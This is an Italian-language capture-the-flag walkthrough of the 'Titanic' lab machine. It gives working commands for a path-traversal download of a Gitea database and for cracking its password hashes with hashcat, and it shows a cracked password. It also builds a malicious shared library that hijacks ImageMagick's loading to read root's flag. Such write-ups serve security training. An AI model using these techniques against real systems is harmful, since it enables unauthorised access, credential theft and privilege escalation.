# 🛳️Titanic CTF -  Walkthrough

## 🕵️‍♂️ Primo Step: Ricognizione

La prima cosa che ho fatto è stata una scansione della rete con **nmap** per individuare porte aperte e servizi attivi.

```bash
nmap -sC -sV -A 10.10.11.55
```

L'output non ha rivelato nulla di particolarmente interessante, quindi ho deciso di analizzare il sito web principale. Dopo un'ispezione manuale senza successo, ho eseguito una scansione con **Gobuster** per cercare sottodomini.

```bash
gobuster dns -d titanic.htb -w common.txt
```

Grazie a questa scansione, ho trovato un sottodominio chiamato `dev`.

Visitando `dev.<target>`, ho scoperto che si trattava di un'istanza di **Gitea**, una piattaforma simile a GitHub per il versionamento del codice. Esplorando il repository pubblico, ho individuato un utente chiamato `developer`, che potrebbe essere interessante.

Scorrendo tra i file caricati, ho trovato dei file di configurazione, uno relativo a **Gitea** e un altro a **MySQL**.

## 📂 Accesso al Database

Ho tentato di connettermi direttamente a MySQL, ma la porta non era aperta. Tuttavia, consultando la documentazione di Gitea, ho scoperto che il database `gitea.db` si trova nel percorso `data/gitea`. Ho provato a scaricarlo con **curl**:

```bash
curl -s "http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db" -o gitea.db
```

Aprendo il database con **sqlite3**, ho trovato la tabella `user` contenente gli hash delle password.

```bash
sqlite3 gitea.db
sqlite> .tables
sqlite> SELECT name, passwd, salt FROM user;
```

L'hash della password era in un formato specifico di Gitea. Per decodificarlo in un formato leggibile da **hashcat**, ho usato uno script Python trovato su GitHub ([gitea2hashcat.py](https://github.com/unix-ninja/hashcat/blob/master/tools/gitea2hashcat.py)).

Dopo la conversione, ho lanciato **hashcat** per effettuare un attacco brute-force usando la wordlist `rockyou.txt`.

```bash
hashcat -m 10900 hash.txt rockyou.txt
```

Dopo qualche minuto, ho trovato la password: **25282528**.

## 🔑 Accesso SSH e User Flag

Ora che ho una password valida, ho provato ad accedere tramite SSH all'utente `developer`:

```bash
ssh developer@10.10.11.55
```

Una volta dentro, ho esplorato la directory home dell'utente e ho trovato la **user flag**!

```bash
cat user.txt
```

## 🚀 Privilege Escalation

Per ottenere i privilegi di root, ho iniziato controllando i permessi di `sudo`:

```bash
sudo -l
```

Purtroppo, non ho trovato comandi eseguibili senza password. Ho quindi esplorato il sistema in cerca di file o processi interessanti.

Dopo un po' di ricerca, ho trovato un file che utilizza una versione vulnerabile di **ImageMagick**.

## 🎨 Exploit di ImageMagick

Per sfruttare la vulnerabilità di ImageMagick, ho utilizzato un approccio basato su una libreria condivisa malevola. In pratica, ImageMagick carica dinamicamente alcune librerie durante l'elaborazione delle immagini, e possiamo sfruttare questa caratteristica per eseguire codice arbitrario.

### 🛠 Creazione del Payload

Ho creato una libreria condivisa (`libxcb.so.1`) contenente il codice malevolo che copia il file `root.txt` in `/tmp/root.txt`. Ho compilato il file con il seguente comando:

```bash
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
__attribute__((constructor)) void init(){
    system("cat /root/root.txt > /tmp/root.txt");
    exit(0);
}
EOF
```

### 📌 Esecuzione dell'Exploit

Una volta che ImageMagick ha elaborato questo file malevolo, il codice all'interno del **costruttore** (`__attribute__((constructor))`) è stato eseguito automaticamente. Questo ha permesso di copiare il contenuto di `root.txt` nella directory `/tmp`, rendendolo leggibile.

In alternativa, avrei potuto incorporare un **reverse shell** nello stesso payload per ottenere un accesso interattivo alla macchina come utente root.

## 🎯 Conclusione

Questa macchina ha richiesto un mix di tecniche di **ricognizione**, **exploit di Gitea**, **cracking di hash**, e **privilege escalation tramite ImageMagick**. È stata una sfida interessante che ha messo alla prova diverse competenze. 🚀
